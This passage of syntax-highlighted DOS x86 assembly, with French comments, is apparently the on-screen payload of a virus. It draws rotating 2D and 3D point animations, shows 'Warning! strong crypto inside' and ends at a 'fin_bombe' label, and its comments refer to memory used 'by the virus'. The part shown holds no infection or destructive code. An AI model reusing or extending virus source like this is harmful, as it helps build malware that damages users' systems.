</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">suite12</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">anim3D</span><span class="sc0">
</span><span class="sc5">suite12</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                    ********************</span><span class="sc0">
</span><span class="sc1">;                    **    PARTIE 2D   **</span><span class="sc0">
</span><span class="sc1">;                    ********************</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">nb_points_2D</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">anim2D</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">cos</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sin</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">160</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sin</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">cos</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;ca devient l'offset video du pixel</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">erase2D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">;stocker les offsets pour l'effacage</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">                      </span><span class="sc1">;couleur=rouge</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;on ecrit le pixel</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">anim2D</span><span class="sc0">

</span><span class="sc1">;----------------------attendre vertical retrace---------------------</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3dah</span><span class="sc0">
</span><span class="sc5">Vrt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Vrt</span><span class="sc0">                 </span><span class="sc1">; Wait until Verticle Retrace starts</span><span class="sc0">
</span><span class="sc5">NoVrt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoVrt</span><span class="sc0">               </span><span class="sc1">; Wait until Verticle Retrace ends</span><span class="sc0">

</span><span class="sc1">;-------------------effacer les points precedents----------------------</span><span class="sc0">
</span><span class="sc1">;ici es=vidéo ds=cs</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">erase3D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">nb_points_2D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">effacer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">318</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">effacer</span><span class="sc0">

</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_bombe</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Mainloop</span><span class="sc0">

</span><span class="sc5">fin_bombe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------rotation-------------</span><span class="sc0">

</span><span class="sc5">rotation</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">cos</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ax = Y * Cos(xang)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sin</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ax = Z * Sin(xang)</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;bp = Y * Cos(xang) - Z * Sin(xang)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">               </span><span class="sc1">;bp = Y * Cos(xang) - Z * Sin(xang) / 256</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sin</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ax = Y * Sin(xang)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">cos</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ax = Z * Cos(xang)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;bp = Y * SIN(xang) + Z * COS(xang)</span><span class="sc0">
</span><span class="sc6">sar</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">               </span><span class="sc1">;bp = Y * SIN(xang) + Z * COS(xang) / 256</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SinCos</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">37</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">43</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">54</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">68</span><span class="sc4">,</span><span class="sc2">71</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">76</span><span class="sc4">,</span><span class="sc2">78</span><span class="sc4">,</span><span class="sc2">81</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc4">,</span><span class="sc2">88</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">92</span><span class="sc4">,</span><span class="sc2">94</span><span class="sc4">,</span><span class="sc2">96</span><span class="sc4">,</span><span class="sc2">98</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc4">,</span><span class="sc2">104</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">106</span><span class="sc4">,</span><span class="sc2">107</span><span class="sc4">,</span><span class="sc2">109</span><span class="sc4">,</span><span class="sc2">111</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">113</span><span class="sc4">,</span><span class="sc2">115</span><span class="sc4">,</span><span class="sc2">116</span><span class="sc4">,</span><span class="sc2">117</span><span class="sc4">,</span><span class="sc2">118</span><span class="sc4">,</span><span class="sc2">120</span><span class="sc4">,</span><span class="sc2">121</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">123</span><span class="sc4">,</span><span class="sc2">124</span><span class="sc4">,</span><span class="sc2">125</span><span class="sc4">,</span><span class="sc2">125</span><span class="sc4">,</span><span class="sc2">126</span><span class="sc4">,</span><span class="sc2">126</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">126</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc4">,</span><span class="sc2">126</span><span class="sc4">,</span><span class="sc2">126</span><span class="sc4">,</span><span class="sc2">126</span><span class="sc4">,</span><span class="sc2">125</span><span class="sc4">,</span><span class="sc2">125</span><span class="sc4">,</span><span class="sc2">124</span><span class="sc4">,</span><span class="sc2">123</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">122</span><span class="sc4">,</span><span class="sc2">121</span><span class="sc4">,</span><span class="sc2">120</span><span class="sc4">,</span><span class="sc2">118</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">117</span><span class="sc4">,</span><span class="sc2">116</span><span class="sc4">,</span><span class="sc2">115</span><span class="sc4">,</span><span class="sc2">113</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">111</span><span class="sc4">,</span><span class="sc2">109</span><span class="sc4">,</span><span class="sc2">107</span><span class="sc4">,</span><span class="sc2">106</span><span class="sc4">,</span><span class="sc2">104</span><span class="sc4">,</span><span class="sc2">102</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc4">,</span><span class="sc2">98</span><span class="sc4">,</span><span class="sc2">96</span><span class="sc4">,</span><span class="sc2">94</span><span class="sc4">,</span><span class="sc2">92</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">88</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">81</span><span class="sc4">,</span><span class="sc2">78</span><span class="sc4">,</span><span class="sc2">76</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc4">,</span><span class="sc2">71</span><span class="sc4">,</span><span class="sc2">68</span><span class="sc4">,</span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">54</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">43</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">37</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">253</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc4">,</span><span class="sc2">247</span><span class="sc4">,</span><span class="sc2">244</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">237</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc4">,</span><span class="sc2">231</span><span class="sc4">,</span><span class="sc2">228</span><span class="sc4">,</span><span class="sc2">225</span><span class="sc4">,</span><span class="sc2">222</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">219</span><span class="sc4">,</span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">213</span><span class="sc4">,</span><span class="sc2">210</span><span class="sc4">,</span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">205</span><span class="sc4">,</span><span class="sc2">202</span><span class="sc4">,</span><span class="sc2">199</span><span class="sc4">,</span><span class="sc2">196</span><span class="sc4">,</span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">191</span><span class="sc4">,</span><span class="sc2">188</span><span class="sc4">,</span><span class="sc2">185</span><span class="sc4">,</span><span class="sc2">183</span><span class="sc4">,</span><span class="sc2">180</span><span class="sc4">,</span><span class="sc2">178</span><span class="sc4">,</span><span class="sc2">175</span><span class="sc4">,</span><span class="sc2">173</span><span class="sc4">,</span><span class="sc2">171</span><span class="sc4">,</span><span class="sc2">168</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">166</span><span class="sc4">,</span><span class="sc2">164</span><span class="sc4">,</span><span class="sc2">162</span><span class="sc4">,</span><span class="sc2">160</span><span class="sc4">,</span><span class="sc2">158</span><span class="sc4">,</span><span class="sc2">156</span><span class="sc4">,</span><span class="sc2">154</span><span class="sc4">,</span><span class="sc2">152</span><span class="sc4">,</span><span class="sc2">150</span><span class="sc4">,</span><span class="sc2">149</span><span class="sc4">,</span><span class="sc2">147</span><span class="sc4">,</span><span class="sc2">145</span><span class="sc4">,</span><span class="sc2">144</span><span class="sc4">,</span><span class="sc2">143</span><span class="sc4">,</span><span class="sc2">141</span><span class="sc4">,</span><span class="sc2">140</span><span class="sc4">,</span><span class="sc2">139</span><span class="sc4">,</span><span class="sc2">138</span><span class="sc4">,</span><span class="sc2">136</span><span class="sc4">,</span><span class="sc2">135</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">134</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc4">,</span><span class="sc2">133</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">129</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc4">,</span><span class="sc2">133</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc4">,</span><span class="sc2">135</span><span class="sc4">,</span><span class="sc2">136</span><span class="sc4">,</span><span class="sc2">138</span><span class="sc4">,</span><span class="sc2">139</span><span class="sc4">,</span><span class="sc2">140</span><span class="sc4">,</span><span class="sc2">141</span><span class="sc4">,</span><span class="sc2">143</span><span class="sc4">,</span><span class="sc2">144</span><span class="sc4">,</span><span class="sc2">145</span><span class="sc4">,</span><span class="sc2">147</span><span class="sc4">,</span><span class="sc2">149</span><span class="sc4">,</span><span class="sc2">150</span><span class="sc4">,</span><span class="sc2">152</span><span class="sc4">,</span><span class="sc2">154</span><span class="sc4">,</span><span class="sc2">156</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">158</span><span class="sc4">,</span><span class="sc2">160</span><span class="sc4">,</span><span class="sc2">162</span><span class="sc4">,</span><span class="sc2">164</span><span class="sc4">,</span><span class="sc2">166</span><span class="sc4">,</span><span class="sc2">168</span><span class="sc4">,</span><span class="sc2">171</span><span class="sc4">,</span><span class="sc2">173</span><span class="sc4">,</span><span class="sc2">175</span><span class="sc4">,</span><span class="sc2">178</span><span class="sc4">,</span><span class="sc2">180</span><span class="sc4">,</span><span class="sc2">183</span><span class="sc4">,</span><span class="sc2">185</span><span class="sc4">,</span><span class="sc2">188</span><span class="sc4">,</span><span class="sc2">191</span><span class="sc4">,</span><span class="sc2">193</span><span class="sc4">,</span><span class="sc2">196</span><span class="sc4">,</span><span class="sc2">199</span><span class="sc4">,</span><span class="sc2">202</span><span class="sc4">,</span><span class="sc2">205</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">207</span><span class="sc4">,</span><span class="sc2">210</span><span class="sc4">,</span><span class="sc2">213</span><span class="sc4">,</span><span class="sc2">216</span><span class="sc4">,</span><span class="sc2">219</span><span class="sc4">,</span><span class="sc2">222</span><span class="sc4">,</span><span class="sc2">225</span><span class="sc4">,</span><span class="sc2">228</span><span class="sc4">,</span><span class="sc2">231</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc4">,</span><span class="sc2">237</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">244</span><span class="sc4">,</span><span class="sc2">247</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc4">,</span><span class="sc2">253</span><span class="sc0">

</span><span class="sc5">message3D</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Warning!$"</span><span class="sc0">
</span><span class="sc5">message2D</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"strong"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"crypto"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"inside"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"$"</span><span class="sc0">

</span><span class="sc5">X</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">Y</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Z</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">angle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sin</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cos</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nb_points_3D</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nb_points_2D</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">erase3D</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">erase2D</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;************ zones memoire utilisees par le virus********************</span><span class="sc0">

</span><span class="sc5">aleat</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0AABBh</span><span class="sc0">
